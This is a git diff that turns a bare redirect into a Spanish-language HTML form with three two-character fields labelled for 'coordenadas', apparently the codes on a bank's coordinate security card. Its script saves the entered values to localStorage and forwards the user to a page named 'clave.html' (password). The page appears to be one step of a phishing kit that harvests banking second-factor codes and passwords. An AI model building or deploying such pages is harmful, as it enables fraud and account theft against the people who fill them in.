@@ -1,1 +1,74 @@
-<html><body><h2>Ingresar Coordenadas</h2><script>window.location.href='clave.html';</script></body></html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Coordenadas</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: white;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .contenedor {
+      border: 3px solid red;
+      width: 90vw;
+      max-width: 400px;
+      padding: 20px;
+      background: white;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    .cuadros {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 15px;
+    }
+    .cuadros input {
+      width: 30%;
+      padding: 10px;
+      font-size: 16px;
+      text-align: center;
+      border: 1px solid black;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="contenedor">
+    <div id="coordenadas-live">
+      <div class="cuadros">
+        <input type="text" maxlength="2" id="c1" required />
+        <input type="text" maxlength="2" id="c2" required />
+        <input type="text" maxlength="2" id="c3" required />
+      </div>
+      <button onclick="continuar()">Continuar</button>
+    </div>
+  </div>
+  <script>
+    function continuar() {
+      const c1 = document.getElementById('c1').value;
+      const c2 = document.getElementById('c2').value;
+      const c3 = document.getElementById('c3').value;
+      localStorage.setItem('coordenadas', `${c1}-${c2}-${c3}`);
+      window.location.href = 'clave.html';
+    }
+  </script>
+</body>
+</html>
